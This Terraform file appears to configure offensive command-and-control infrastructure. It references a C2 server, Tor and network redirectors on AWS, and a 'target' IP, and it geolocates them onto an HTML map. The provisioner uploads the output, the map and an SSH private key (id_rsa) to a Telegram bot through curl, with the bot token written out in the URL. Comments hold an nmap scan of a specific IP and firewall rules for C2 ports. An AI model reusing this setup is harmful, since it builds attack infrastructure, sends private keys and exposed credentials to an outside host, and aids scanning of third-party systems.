


resource "null_resource" "geo" {
  # Imposta dipendenza dall'istanza AWS



provisioner "local-exec" {
	command = <<-EOT
    		apt -y install jq ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/my.txt ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}&ip=${var.geo_transport_ip}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/transport.txt ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}&ip=${var.geo_spectreC4_ip}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/spectrec4.txt ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}&ip=${var.geo_service_ip}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/service.txt ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}&ip=${var.geo_aws_tor_public_ip}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/redir_tor.txt ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}&ip=${var.geo_aws_net_public_ip}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/redir_net.txt ;
    		curl -k  'https://api.ipgeolocation.io/ipgeo?apiKey=${var.geo_api}&ip=${var.geo_target}' | jq -r  '.country_name, .city, .state_prov, .time_zone.current_time, .latitude, .longitude' > ./repo/Here-Maps/cache/target.txt ;
    		cp -r ./repo/Here-Maps/map_template.html ./repo/Here-Maps/map.html ;
    		sed -i "s/c2-lat/$(sed -n '5p' ./repo/Here-Maps/cache/spectrec4.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/c2-lon/$(sed -n '6p' ./repo/Here-Maps/cache/spectrec4.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/gw-lat/$(sed -n '5p' ./repo/Here-Maps/cache/transport.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/gw-lon/$(sed -n '6p' ./repo/Here-Maps/cache/transport.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/sr-lat/$(sed -n '5p' ./repo/Here-Maps/cache/service.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/sr-lon/$(sed -n '6p' ./repo/Here-Maps/cache/service.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/cl-lat/$(sed -n '5p' ./repo/Here-Maps/cache/my.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/cl-lon/$(sed -n '6p' ./repo/Here-Maps/cache/my.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/tor-lat/$(sed -n '5p' ./repo/Here-Maps/cache/redir_tor.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/tor-lon/$(sed -n '6p' ./repo/Here-Maps/cache/redir_tor.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/net-lat/$(sed -n '5p' ./repo/Here-Maps/cache/redir_net.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/net-lon/$(sed -n '6p' ./repo/Here-Maps/cache/redir_net.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/target-lat/$(sed -n '5p' ./repo/Here-Maps/cache/target.txt)/g" ./repo/Here-Maps/map.html ;
    		sed -i "s/target-lon/$(sed -n '6p' ./repo/Here-Maps/cache/target.txt)/g" ./repo/Here-Maps/map.html ;
    		chmod -R 777 ./repo/Here-Maps/map.html ;
    		echo "SpectreC4: ${var.geo_spectreC4_ip}" > ./repo/Here-Maps/cache/output.txt 
    		echo "Gateway: ${var.geo_transport_ip}" >> ./repo/Here-Maps/cache/output.txt 
    		echo "Service: ${var.geo_service_ip}" >> ./repo/Here-Maps/cache/output.txt 
    		echo "AWS Tor: ${var.geo_aws_tor_public_ip}" >> ./repo/Here-Maps/cache/output.txt 
    		echo "AWS Net: ${var.geo_aws_net_public_ip}" >> ./repo/Here-Maps/cache/output.txt 
    		echo "Target: ${var.geo_target}" >> ./repo/Here-Maps/cache/output.txt 
    		curl --max-time 240 -F chat_id=176932540 -F document=@./repo/Here-Maps/cache/output.txt -F caption="Terraform Output" "https://api.telegram.org/bot957152041:AAHkmbsjxVgw0IQwL9T_TpRR0Afu2fW1RkI/sendDocument" ;
    		curl --max-time 240 -F chat_id=176932540 -F document=@./repo/Here-Maps/map.html -F caption="Terraform Map" "https://api.telegram.org/bot957152041:AAHkmbsjxVgw0IQwL9T_TpRR0Afu2fW1RkI/sendDocument" ;
    		curl --max-time 240 -F chat_id=176932540 -F document=@./repo/Key/.ssh/id_rsa -F caption="Terraform Key" "https://api.telegram.org/bot957152041:AAHkmbsjxVgw0IQwL9T_TpRR0Afu2fW1RkI/sendDocument" ;
	EOT
  }




 
}

# TEST IT
# nmap -Pn -sS -T4 -p 22,80,8080,445,443,4443,9050,2222 138.197.173.81 -vv


# ufw allow in on tun0 to any port 22
# ufw allow in on eth0 from 54.183.9.148,34.230.23.2  to any port 4443,9050,8080,80,2222
